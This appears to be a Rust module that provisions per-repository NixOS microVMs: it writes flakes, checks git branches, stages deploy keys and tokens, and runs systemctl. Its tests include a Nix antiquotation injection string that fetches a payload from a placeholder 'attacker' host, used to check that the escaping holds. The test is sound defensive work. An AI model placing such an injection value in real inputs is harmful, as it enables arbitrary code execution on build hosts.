use crate::config::Settings;
use crate::error::{ApiError, ApiResult};
use std::path::{Component, Path};
use tokio::io::AsyncWriteExt;
use tokio::process::Command;

/// Subdirectories that live under each VM's persistent volume. The Nix side
/// (lib/repo-vm.nix) bind-mounts these into ~/.claude/* and ~/.ssh; keep the
/// two lists in lockstep.
pub const PERSISTENT_SUBDIRS: &[&str] = &["projects", "todos", "statsig", "ssh", "work"];

/// Encode the last octet of an IP into the trailing byte of a deterministic MAC.
/// Locally-administered unicast prefix `02:00:00:00:00:XX` is fine within a /24;
/// if we ever add a second bridge, hash the full IP instead.
pub fn mac_from_ip(ip: &str) -> String {
    let last = ip
        .rsplit('.')
        .next()
        .and_then(|s| s.parse::<u8>().ok())
        .unwrap_or(0);
    format!("02:00:00:00:00:{:02x}", last)
}

fn nix_str(s: &str) -> String {
    // Serialize a Rust &str as a Nix string literal. Reusing JSON quoting works
    // because Nix accepts the same backslash escapes plus we explicitly handle
    // ${ (Nix antiquotation) by inserting a backslash. Without this guard, a
    // repo URL containing ${ would inject arbitrary Nix into the VM flake.
    let json = serde_json::to_string(s).unwrap_or_else(|_| "\"\"".into());
    json.replace("${", "\\${")
}

pub async fn write_vm_flake(
    settings: &Settings,
    name: &str,
    repo_url: &str,
    branch: &str,
    vm_ip: &str,
    vm_mac: &str,
    vcpu: i64,
    mem_mb: i64,
    permission_mode: &str,
) -> ApiResult<()> {
    let dir = settings.vm_flake_dir(name);
    // Nuke and recreate so a stale flake.lock from a prior create can't
    // pin the lagrange input to an old commit. microvm CLI generates a
    // fresh lock from flake.nix on first eval.
    match tokio::fs::remove_dir_all(&dir).await {
        Ok(_) => {}
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => return Err(ApiError::Io(e)),
    }
    tokio::fs::create_dir_all(&dir).await?;

    let flake = format!(
        r#"{{
  description = "lagrange repo-VM: {name}";

  inputs.lagrange.url = {flake_ref};

  outputs = {{ lagrange, ... }}: {{
    nixosConfigurations.{name} = lagrange.lib.mkRepoVm {{
      name = {name_lit};
      repoUrl = {repo_url};
      branch = {branch};
      vmIp = {vm_ip};
      vmMac = {vm_mac};
      vcpu = {vcpu};
      memMb = {mem_mb};
      permissionMode = {permission_mode};
    }};
  }};
}}
"#,
        name = name,
        flake_ref = nix_str(&settings.flake_ref),
        name_lit = nix_str(name),
        repo_url = nix_str(repo_url),
        branch = nix_str(branch),
        vm_ip = nix_str(vm_ip),
        vm_mac = nix_str(vm_mac),
        vcpu = vcpu,
        mem_mb = mem_mb,
        permission_mode = nix_str(permission_mode),
    );

    let path = dir.join("flake.nix");
    let mut f = tokio::fs::File::create(&path).await?;
    f.write_all(flake.as_bytes()).await?;
    f.sync_all().await?;
    Ok(())
}

pub async fn validate_repo_reachable(
    settings: &Settings,
    repo_url: &str,
    branch: &str,
    name: &str,
) -> ApiResult<()> {
    let deploy_key = settings.deploy_key_path(name);
    let mut cmd = Command::new("git");
    if deploy_key.exists() {
        cmd.env(
            "GIT_SSH_COMMAND",
            format!(
                "ssh -i {} -o StrictHostKeyChecking=accept-new -o BatchMode=yes",
                deploy_key.display()
            ),
        );
    } else {
        cmd.env("GIT_SSH_COMMAND", "ssh -o BatchMode=yes");
    }
    let out = cmd
        .arg("ls-remote")
        .arg("--heads")
        .arg(repo_url)
        .arg(branch)
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawning git: {e}")))?;

    if !out.status.success() {
        return Err(ApiError::BadRequest(format!(
            "git ls-remote failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    if out.stdout.is_empty() {
        return Err(ApiError::BadRequest(format!(
            "branch {} not found on {}",
            branch, repo_url
        )));
    }
    Ok(())
}

pub async fn provision_persistent_volume(settings: &Settings, name: &str) -> ApiResult<()> {
    let root = settings.agent_state_dir(name);
    for sub in PERSISTENT_SUBDIRS {
        tokio::fs::create_dir_all(root.join(sub)).await?;
    }
    let gc = root.join("gitconfig");
    if !gc.exists() {
        tokio::fs::write(&gc, "").await?;
    }
    let src_key = settings.deploy_key_path(name);
    if src_key.exists() {
        let dst = root.join("ssh").join("id_ed25519");
        tokio::fs::copy(&src_key, &dst).await?;
        use std::os::unix::fs::PermissionsExt;
        let mut perms = tokio::fs::metadata(&dst).await?.permissions();
        perms.set_mode(0o600);
        tokio::fs::set_permissions(&dst, perms).await?;
    }
    // Full-scope Claude session needed by Remote Control. No-op when the
    // operator hasn't run `claude auth login` and POSTed the result yet.
    crate::credentials::stage_for_vm(settings, name).await?;
    // GitHub fine-grained PAT for git push. No-op when not configured.
    crate::github_token::stage_for_vm(settings, name).await?;
    Ok(())
}

pub async fn microvm_create_and_start(settings: &Settings, name: &str) -> ApiResult<()> {
    let flake_path = settings.vm_flake_dir(name);
    // -c gives the VM name; -f takes the flake URI WITHOUT an attribute
    // fragment. The CLI builds the full attr path
    // (`#nixosConfigurations.<name>.config.microvm.declaredRunner`) itself —
    // passing `<path>#<name>` here gave Nix a malformed attr with a stray
    // `#` in the middle.
    let flake_ref = flake_path.display().to_string();

    run_cmd("microvm", &["-c", name, "-f", &flake_ref]).await?;
    run_cmd("systemctl", &["start", &format!("microvm@{}", name)]).await?;
    Ok(())
}

pub async fn microvm_stop(name: &str) -> ApiResult<()> {
    run_cmd("systemctl", &["stop", &format!("microvm@{}", name)]).await
}

pub async fn microvm_restart(name: &str) -> ApiResult<()> {
    run_cmd("systemctl", &["restart", &format!("microvm@{}", name)]).await
}

pub async fn microvm_status(name: &str) -> ApiResult<String> {
    let out = Command::new("systemctl")
        .arg("is-active")
        .arg(format!("microvm@{}", name))
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn systemctl: {e}")))?;
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

pub async fn microvm_destroy(name: &str) -> ApiResult<()> {
    let _ = microvm_stop(name).await;
    run_cmd("microvm", &["-d", name]).await
}

pub async fn vm_journal_tail(name: &str, lines: u32) -> ApiResult<String> {
    // lagrange-admin is in the systemd-journal group, so `journalctl -u` for
    // system units works without sudo.
    let out = Command::new("journalctl")
        .args([
            "-u",
            &format!("microvm@{}", name),
            "-n",
            &lines.to_string(),
            "--no-pager",
        ])
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn journalctl: {e}")))?;
    if !out.status.success() {
        return Err(ApiError::Subprocess(format!(
            "journalctl failed (exit {}): {}",
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// Run a privileged-on-host command directly. systemctl actions on
/// microvm@*.service are gated by a polkit rule that allows the microvm
/// group; `microvm -c/-d` only needs group write on /var/lib/microvms. No
/// setuid involved — NoNewPrivileges stays on.
async fn run_cmd(cmd: &str, args: &[&str]) -> ApiResult<()> {
    let out = Command::new(cmd)
        .args(args)
        .output()
        .await
        .map_err(|e| ApiError::Subprocess(format!("spawn {cmd}: {e}")))?;
    if !out.status.success() {
        return Err(ApiError::Subprocess(format!(
            "{} {:?} exit {}: {}",
            cmd,
            args,
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stderr).trim()
        )));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mac_from_ip_encodes_last_octet() {
        assert_eq!(mac_from_ip("10.42.0.10"), "02:00:00:00:00:0a");
        assert_eq!(mac_from_ip("10.42.0.255"), "02:00:00:00:00:ff");
    }

    #[test]
    fn mac_from_ip_handles_malformed() {
        assert_eq!(mac_from_ip("not-an-ip"), "02:00:00:00:00:00");
    }

    #[test]
    fn nix_str_quotes_simple_strings() {
        assert_eq!(nix_str("hello"), "\"hello\"");
    }

    #[test]
    fn nix_str_escapes_antiquotation() {
        // Without escaping, a value containing ${ would be interpreted as
        // Nix antiquotation and could inject arbitrary expressions into
        // the generated VM flake. Verify every ${ is preceded by a backslash.
        let evil = "${builtins.fetchurl \"http://attacker/payload\"}";
        let out = nix_str(evil);
        assert!(out.contains("\\${"), "expected escaped antiquotation in {out:?}");
        let with_escapes_removed = out.replace("\\${", "");
        assert!(
            !with_escapes_removed.contains("${"),
            "unescaped ${{ in output: {out:?}"
        );
    }

    #[test]
    fn nix_str_escapes_quotes_and_backslashes() {
        let out = nix_str("a\"b\\c");
        assert_eq!(out, "\"a\\\"b\\\\c\"");
    }
}

/// Delete the per-repo persistent volume. Refuses to follow symlinks at the
/// volume root and refuses any path that escapes `agent_state_root` via `..`.
pub async fn wipe_persistent_volume(settings: &Settings, name: &str) -> ApiResult<()> {
    for c in Path::new(name).components() {
        if !matches!(c, Component::Normal(_)) {
            return Err(ApiError::BadRequest(format!("invalid vm name {name}")));
        }
    }
    let target = settings.agent_state_dir(name);
    if !target.exists() {
        return Ok(());
    }
    // symlink_metadata does NOT follow symlinks; if the entry is a symlink we
    // refuse rather than delete what it points at.
    let md = tokio::fs::symlink_metadata(&target).await?;
    if md.file_type().is_symlink() {
        return Err(ApiError::BadRequest(format!(
            "{} is a symlink; refusing to delete",
            target.display()
        )));
    }
    tokio::fs::remove_dir_all(&target).await?;
    Ok(())
}
